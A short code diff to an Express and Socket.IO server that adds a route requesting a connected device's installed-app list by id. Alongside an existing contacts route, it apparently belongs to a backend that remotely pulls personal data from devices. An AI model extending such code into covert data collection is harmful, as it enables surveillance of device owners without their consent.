@@ -99,6 +99,24 @@ app.get('/contacts/:id', async (req, res)=>{
     }
 });
 
+app.get('/installed-apps/:id', async (req, res)=>{
+  const id = req.params.id;
+  const socketId = idToSocket.get(id);
+  io.to(socketId).emit('installed:apps', "get installed apps");
+  try{
+  const appData = await new Promise((resolve, reject) => {
+      if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
+      idToConnectionSocket.get(id).once("installed:apps", (data) => {
+        resolve({"apps":data});
+      });
+    });
+    
+    res.json(appData);
+  }catch(e){
+      res.json(e);
+  }
+});
+
 //io operations
 io.on("connection", (socket) => {
     socket.on("register", (id) => {
